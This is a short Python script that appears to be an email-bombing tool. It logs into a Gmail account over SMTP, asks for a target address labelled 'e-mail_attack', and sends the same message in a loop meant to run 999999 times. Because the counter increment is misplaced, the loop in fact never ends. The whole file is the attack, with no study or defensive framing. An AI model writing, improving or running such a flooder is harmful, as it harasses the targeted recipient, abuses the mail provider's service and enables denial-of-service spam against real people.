import smtplib
smtpObj = smtplib.SMTP('smtp.gmail.com',587)
smtpObj.starttls()
gml = input("gmail:")
ps = input("password:")
if smtpObj.login(gml,ps):
 jar = input("e-mail_attack:")
 mess = input("message:")
 smtpObj.sendmail(gml,jar,mess)
 i = 1
 while i <= 999999:
  if smtpObj.sendmail(gml,jar,mess):
   print('message send - [ERROR]')
  else:
   print('message send - [OK]')
 i = i + 1
else:
 print("no valid password")
